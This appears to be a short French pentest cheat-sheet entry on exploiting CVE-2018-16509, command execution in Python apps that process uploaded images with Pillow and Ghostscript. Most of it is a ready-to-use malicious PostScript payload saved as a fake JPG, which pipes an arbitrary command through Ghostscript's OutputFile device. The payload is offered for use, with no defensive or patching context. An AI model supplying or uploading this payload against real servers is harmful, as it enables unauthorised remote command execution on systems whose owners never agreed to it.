# File Upload

## CVE-2018-16509

(Python PIL/Pillow Remote Shell Command Execution via Ghostscript)

S'il est possible d'_upload_ une image sur une application Web python qui utilise `PIL` (`from PIL import Image`). Il se peut que celui-ci utilise également `ghostscript`(`/usr/local/bin/gs`). Dans ce cas, il est fort probable que la CVE soit exploitable.

```
# Contenu du fichier RCE.JPG :
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%<CMD>) currentdevice putdeviceprops
```
